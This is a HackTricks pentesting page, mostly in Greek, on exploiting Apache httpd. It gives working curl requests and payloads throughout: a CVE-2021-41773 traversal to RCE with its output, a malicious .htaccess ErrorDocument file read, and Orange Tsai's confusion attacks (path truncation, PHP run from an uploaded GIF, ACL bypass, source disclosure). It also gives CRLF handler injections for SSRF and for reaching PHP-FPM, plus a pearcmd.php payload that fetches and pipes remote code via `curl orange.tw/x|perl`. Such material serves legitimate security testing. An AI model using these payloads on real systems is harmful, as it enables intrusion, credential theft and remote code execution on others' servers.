# Apache

{{#include ../../banners/hacktricks-training.md}}

## Εκτελέσιμες επεκτάσεις PHP

Ελέγξτε ποιες επεκτάσεις PHP εκτελεί ο Apache. Για να τις αναζητήσετε μπορείτε να εκτελέσετε:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Επίσης, μερικά μέρη όπου μπορείτε να βρείτε αυτή τη διαμόρφωση είναι:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
## LFI μέσω .htaccess ErrorDocument file provider (ap_expr)

Αν μπορείτε να ελέγξετε το .htaccess ενός καταλόγου και το AllowOverride περιλαμβάνει FileInfo για αυτό το μονοπάτι, μπορείτε να μετατρέψετε τις 404 απαντήσεις σε αυθαίρετες τοπικές αναγνώσεις αρχείων χρησιμοποιώντας τη συνάρτηση ap_expr file() μέσα στο ErrorDocument.

- Απαιτήσεις:
- Apache 2.4 με ενεργοποιημένο parser εκφράσεων (ap_expr) (προεπιλογή στο 2.4).
- Ο vhost/dir πρέπει να επιτρέπει στο .htaccess να ορίσει το ErrorDocument (AllowOverride FileInfo).
- Ο Apache worker user πρέπει να έχει δικαιώματα ανάγνωσης στο αρχείο-στόχο.

.htaccess payload:
```apache
# Optional marker header just to identify your tenant/request path
Header always set X-Debug-Tenant "demo"
# On any 404 under this directory, return the contents of an absolute filesystem path
ErrorDocument 404 %{file:/etc/passwd}
```
Προκαλείται ζητώντας οποιοδήποτε μη υπάρχον μονοπάτι κάτω από αυτόν τον κατάλογο, για παράδειγμα όταν γίνεται κατάχρηση του userdir-style hosting:
```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```
Notes and tips:
- Μόνο οι απόλυτες διαδρομές λειτουργούν. Το περιεχόμενο επιστρέφεται ως το response body για τον 404 handler.
- Οι αποτελεσματικές άδειες ανάγνωσης είναι αυτές του χρήστη Apache (τυπικά www-data/apache). Δεν θα διαβάσετε /root/* ή /etc/shadow σε προεπιλεγμένες ρυθμίσεις.
- Ακόμα κι αν το .htaccess είναι root-owned, αν ο γονικός κατάλογος ανήκει σε tenant και επιτρέπει rename, μπορεί να καταφέρετε να μετονομάσετε το αρχικό .htaccess και να ανεβάσετε τη δική σας αντικατάσταση μέσω SFTP/FTP:
- rename .htaccess .htaccess.bk
- put your malicious .htaccess
- Χρησιμοποιήστε αυτό για να διαβάσετε τον πηγαίο κώδικα της εφαρμογής κάτω από DocumentRoot ή vhost config paths για να συλλέξετε μυστικά (DB creds, API keys, κ.λπ.).

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

These types of attacks has been introduced and documented [**by Orange in this blog post**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) and the following is a summary. Η επίθεση "confusion" καταχράται ουσιαστικά το γεγονός ότι οι δεκάδες modules που συνεργάζονται για να δημιουργήσουν ένα Apache δεν λειτουργούν τέλεια συγχρονισμένα, και το ότι μερικά από αυτά τροποποιούν απροσδόκητα δεδομένα μπορεί να προκαλέσει ευπάθεια σε μεταγενέστερο module.

### Filename Confusion

#### Truncation

The **`mod_rewrite`** will trim the content of `r->filename` after the character `?` ([_**modules/mappers/mod_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)). Αυτό δεν είναι εντελώς λάθος καθώς τα περισσότερα modules θα αντιμετωπίσουν το `r->filename` ως URL. Αλλά σε άλλες περιπτώσεις αυτό θα αντιμετωπιστεί ως διαδρομή αρχείου, γεγονός που μπορεί να προκαλέσει πρόβλημα.

- **Path Truncation**

Είναι δυνατόν να καταχραστείτε το `mod_rewrite` όπως στο παρακάτω παράδειγμα κανόνα για να αποκτήσετε πρόσβαση σε άλλα αρχεία στο σύστημα αρχείων, αφαιρώντας το τελευταίο μέρος της αναμενόμενης διαδρομής απλά προσθέτοντας ένα `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
# the output of file `/var/user/orange/secret.yml`
```
- **Mislead RewriteFlag Assignment**

Στον ακόλουθο rewrite rule, όσο το URL τελειώνει σε .php, θα αντιμετωπίζεται και θα εκτελείται ως php. Επομένως, είναι δυνατόν να στείλετε ένα URL που τελειώνει σε .php μετά τον χαρακτήρα `?`, ενώ στο path φορτώνετε έναν διαφορετικό τύπο αρχείου (όπως μια εικόνα) που περιέχει κακόβουλο κώδικα php:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

Είναι δυνατόν να αποκτηθεί πρόσβαση σε αρχεία στα οποία ο χρήστης δεν θα έπρεπε να έχει πρόσβαση, ακόμη και αν η πρόσβαση θα έπρεπε να απορρίπτεται με ρυθμίσεις όπως:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Αυτό συμβαίνει επειδή από προεπιλογή το PHP-FPM θα λαμβάνει URLs που τελειώνουν σε `.php`, όπως `http://server/admin.php%3Fooo.php` και επειδή το PHP-FPM θα αφαιρεί οτιδήποτε μετά τον χαρακτήρα `?`, το προηγούμενο URL θα επιτρέψει τη φόρτωση του `/admin.php` ακόμη και αν ο προηγούμενος κανόνας το απαγόρευε.

### DocumentRoot Σύγχυση
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
A fun fact about Apache is that the previous rewrite will try to access the file from both the documentRoot and from root. So, a request to `https://server/abouth.html` will check for the file in `/var/www/html/about.html` and `/about.html` in the file system. Which basically can be abused to access files in the file system.

#### **Server-Side Source Code Disclosure**

- **Disclose CGI Source Code**

Απλώς προσθέτοντας %3F στο τέλος αρκεί για να leak τον source code ενός cgi module:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
- **Αποκάλυψη PHP Source Code**

Εάν ένας server διαθέτει διαφορετικά domains και ένα από αυτά είναι static domain, αυτό μπορεί να χρησιμοποιηθεί καταχρηστικά για να περιηγηθεί στο file system και να leak php code:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Local Gadgets Manipulation**

Το κύριο πρόβλημα με την προηγούμενη επίθεση είναι ότι, από προεπιλογή, οι περισσότερες προσβάσεις στο filesystem θα απορριφθούν όπως στο Apache HTTP Server’s [configuration template](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115):
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Ωστόσο, τα [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) λειτουργικά συστήματα επιτρέπουν εξ ορισμού το `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Επομένως, θα ήταν δυνατό να γίνει κατάχρηση των αρχείων που βρίσκονται στο `/usr/share` σε αυτές τις διανομές.

Local Gadget to Information Disclosure

- **Apache HTTP Server** με **websocketd** μπορεί να εκθέσει το script **dump-env.php** στο **/usr/share/doc/websocketd/examples/php/**, το οποίο μπορεί να leak ευαίσθητες μεταβλητές περιβάλλοντος.
- Διακομιστές με **Nginx** ή **Jetty** ενδέχεται να εκθέσουν ευαίσθητες πληροφορίες web εφαρμογών (π.χ. **web.xml**) μέσω των προεπιλεγμένων web roots που τοποθετούνται κάτω από **/usr/share**:
- **/usr/share/nginx/html/**
- **/usr/share/jetty9/etc/**
- **/usr/share/jetty9/webapps/**

Local Gadget to XSS

- Σε Ubuntu Desktop με **LibreOffice εγκατεστημένο**, η εκμετάλλευση της λειτουργίας αλλαγής γλώσσας των αρχείων βοήθειας μπορεί να οδηγήσει σε **Cross-Site Scripting (XSS)**. Η χειραγώγηση του URL στο **/usr/share/libreoffice/help/help.html** μπορεί να ανακατευθύνει σε κακόβουλες σελίδες ή παλαιότερες εκδόσεις μέσω **unsafe RewriteRule**.

Local Gadget to LFI

- Εάν το PHP ή ορισμένα front-end πακέτα όπως **JpGraph** ή **jQuery-jFeed** είναι εγκατεστημένα, τα αρχεία τους μπορούν να εκμεταλλευτούν για να διαβαστούν ευαίσθητα αρχεία όπως **/etc/passwd**:
- **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
- **/usr/share/javascript/jquery-jfeed/proxy.php**
- **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

Local Gadget to SSRF

- Η χρήση του **magpie_debug.php** του **MagpieRSS** στο **/usr/share/php/magpierss/scripts/magpie_debug.php**, μπορεί να δημιουργήσει εύκολα μια ευπάθεια SSRF, παρέχοντας πύλη για περαιτέρω εκμεταλλεύσεις.

Local Gadget to RCE

- Οι ευκαιρίες για **Remote Code Execution (RCE)** είναι πολλές, με ευάλωτες εγκαταστάσεις όπως ένα παρωχημένο **PHPUnit** ή **phpLiteAdmin**. Αυτές μπορούν να εκμεταλλευτούν για την εκτέλεση αυθαίρετου κώδικα, δείχνοντας το εκτεταμένο δυναμικό της χειραγώγησης local gadgets.

#### **Jailbreak from Local Gadgets**

Επίσης είναι δυνατό να jailbreak από τους επιτρεπόμενους φακέλους ακολουθώντας symlinks που δημιουργούνται από εγκατεστημένο λογισμικό σε αυτούς τους φακέλους, όπως:

- **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Επιπλέον, με την κατάχρηση symlinks ήταν δυνατό να επιτευχθεί **RCE σε Redmine.**

### Handler Confusion <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Αυτή η επίθεση εκμεταλλεύεται την επικάλυψη στη λειτουργικότητα μεταξύ των οδηγιών `AddHandler` και `AddType`, οι οποίες και οι δύο μπορούν να χρησιμοποιηθούν για να ενεργοποιήσουν την επεξεργασία PHP. Αρχικά, αυτές οι οδηγίες επηρέαζαν διαφορετικά πεδία (`r->handler` και `r->content_type` αντίστοιχα) στη εσωτερική δομή του server. Ωστόσο, λόγω legacy κώδικα, ο Apache χειρίζεται αυτές τις οδηγίες εναλλασσόμενα υπό ορισμένες συνθήκες, μετατρέποντας το `r->content_type` σε `r->handler` αν το πρώτο είναι ορισμένο και το δεύτερο όχι.

Επιπλέον, στον Apache HTTP Server (`server/config.c#L420`), αν το `r->handler` είναι κενό πριν την εκτέλεση του `ap_run_handler()`, ο server **χρησιμοποιεί το `r->content_type` ως handler**, κάνοντας ουσιαστικά το `AddType` και το `AddHandler` ίσα στην επίδραση.

#### **Overwrite Handler to Disclose PHP Source Code**

In [**this talk**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf), παρουσιάστηκε μια ευπάθεια όπου ένα λανθασμένο `Content-Length` που αποστέλλεται από έναν client μπορεί να κάνει τον Apache να **επιστρέψει τον PHP πηγαίο κώδικα**. Αυτό συνέβη λόγω ενός προβλήματος διαχείρισης σφαλμάτων με το ModSecurity και το Apache Portable Runtime (APR), όπου μια διπλή ανταπόκριση οδηγεί στην υπεργραφή του `r->content_type` σε `text/html`.\
Επειδή το ModSecurity δεν χειρίζεται σωστά τις επιστρεφόμενες τιμές, θα επέστρεφε τον PHP κώδικα και δεν θα τον ερμήνευε.

#### **Overwrite Handler to XXXX**

TODO: Η Orange δεν έχει αποκαλύψει ακόμα αυτή την ευπάθεια

### **Invoke Arbitrary Handlers**

Εάν ένας επιτιθέμενος καταφέρει να ελέγξει την κεφαλίδα **`Content-Type`** στην απάντηση του server, θα μπορεί να invoke arbitrary module handlers. Ωστόσο, μέχρι το σημείο που ο επιτιθέμενος ελέγχει αυτό, το μεγαλύτερο μέρος της επεξεργασίας του request θα έχει ήδη γίνει. Παρ' όλα αυτά, είναι δυνατό να **επαναεκκινήσει τη διαδικασία του request καταχρώμενος την κεφαλίδα `Location`** επειδή αν το **r**eturned `Status` είναι 200 και η κεφαλίδα `Location` ξεκινά με `/`, η απάντηση θεωρείται Server-Side Redirection και θα πρέπει να επεξεργαστεί

According to [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (specification about CGI) in [Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) defines a Local Redirect Response behavior:

> Το CGI script μπορεί να επιστρέψει ένα URI path και query-string (‘local-pathquery’) για έναν τοπικό πόρο σε ένα πεδίο κεφαλίδας Location. Αυτό υποδηλώνει στον server ότι θα πρέπει να επανεπεξεργαστεί το request χρησιμοποιώντας το καθορισμένο path.

Επομένως, για να εκτελεστεί αυτή η επίθεση χρειάζεται μία από τις παρακάτω ευπάθειες:

- CRLF Injection in the CGI response headers
- SSRF with complete control of the response headers

#### **Arbitrary Handler to Information Disclosure**

For example `/server-status` should only be accessible locally:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Είναι δυνατή η πρόσβαση σε αυτό ορίζοντας το `Content-Type` σε `server-status` και την κεφαλίδα Location να ξεκινά με `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Αυθαίρετος handler σε πλήρες SSRF**

Ανακατεύθυνση σε `mod_proxy` για πρόσβαση σε οποιοδήποτε πρωτόκολλο σε οποιοδήποτε URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Ωστόσο, η κεφαλίδα `X-Forwarded-For` προστίθεται, εμποδίζοντας την πρόσβαση σε cloud metadata endpoints.

#### **Arbitrary Handler για πρόσβαση στο τοπικό Unix Domain Socket**

Πρόσβαση στο τοπικό Unix Domain Socket του PHP-FPM για την εκτέλεση ενός PHP backdoor που βρίσκεται στο `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Αυθαίρετος Handler σε RCE**

Η επίσημη εικόνα [PHP Docker](https://hub.docker.com/_/php) περιλαμβάνει το PEAR (`Pearcmd.php`), ένα εργαλείο διαχείρισης πακέτων PHP μέσω γραμμής εντολών, το οποίο μπορεί να καταχραστεί για να επιτευχθεί RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Δείτε [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), που γράφτηκε από [Phith0n](https://x.com/phithon_xg) για τις λεπτομέρειες αυτής της τεχνικής.

## Αναφορές

- [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)
- [Apache 2.4 Custom Error Responses (ErrorDocument)](https://httpd.apache.org/docs/2.4/custom-error.html)
- [Apache 2.4 Expressions and functions (file:)](https://httpd.apache.org/docs/2.4/expr.html)
- [HTB Zero write-up: .htaccess ErrorDocument LFI and cron pgrep abuse](https://0xdf.gitlab.io/2025/08/12/htb-zero.html)

{{#include ../../banners/hacktricks-training.md}}
